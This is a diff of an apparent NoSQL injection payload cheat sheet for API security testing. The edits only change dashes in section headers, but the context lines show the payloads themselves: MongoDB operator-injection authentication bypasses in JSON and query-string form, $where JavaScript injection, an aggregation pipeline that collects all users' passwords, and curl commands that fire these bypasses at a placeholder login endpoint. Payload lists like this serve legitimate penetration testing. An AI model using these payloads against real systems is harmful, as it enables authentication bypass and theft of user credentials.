@@ -1,20 +1,20 @@
-# NoSQL Injection Payloads — API Security Testing
-# OWASP API Security: API8/API10 — Injection
+# NoSQL Injection Payloads - API Security Testing
+# OWASP API Security: API8/API10 - Injection
 # Severity: HIGH to CRITICAL
 # Targets: MongoDB, CouchDB, Cassandra, Redis
 
 # ============================================================
-# 1. MONGODB — OPERATOR INJECTION
+# 1. MONGODB - OPERATOR INJECTION
 # ============================================================
 
-# Authentication bypass — JSON body
+# Authentication bypass - JSON body
 {"email": {"$gt": ""}, "password": {"$gt": ""}}
 {"email": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}}
 {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}
 {"email": {"$exists": true}, "password": {"$exists": true}}
 {"email": {"$nin": []}, "password": {"$nin": []}}
 
-# Auth bypass — query parameter style
+# Auth bypass - query parameter style
 email[$gt]=&password[$gt]=
 email[$ne]=nonexistent&password[$ne]=nonexistent
 email[$regex]=.*&password[$regex]=.*
@@ -32,7 +32,7 @@ email[$exists]=true&password[$exists]=true
 # Binary search based on response
 
 # ============================================================
-# 2. MONGODB — $WHERE INJECTION
+# 2. MONGODB - $WHERE INJECTION
 # ============================================================
 
 # JavaScript execution in $where
@@ -51,7 +51,7 @@ filter[$where]=1==1
 search[$where]=this.password.match(/.*/)
 
 # ============================================================
-# 3. MONGODB — AGGREGATION PIPELINE INJECTION
+# 3. MONGODB - AGGREGATION PIPELINE INJECTION
 # ============================================================
 
 # $lookup to access other collections
@@ -61,15 +61,15 @@ search[$where]=this.password.match(/.*/)
 {"pipeline": [{"$group": {"_id": "$email", "passwords": {"$push": "$password"}}}]}
 
 # ============================================================
-# 4. MONGODB — COMMON API PATTERNS
+# 4. MONGODB - COMMON API PATTERNS
 # ============================================================
 
-# REST API — JSON body injection
+# REST API - JSON body injection
 curl -X POST https://api.target.com/api/v1/login \
   -H "Content-Type: application/json" \
   -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
 
-# REST API — query parameter injection
+# REST API - query parameter injection
 curl "https://api.target.com/api/v1/users?email[\$ne]=nonexistent"
 curl "https://api.target.com/api/v1/users?email[\$regex]=admin"
 curl "https://api.target.com/api/v1/products?price[\$gt]=0&price[\$lt]=99999"
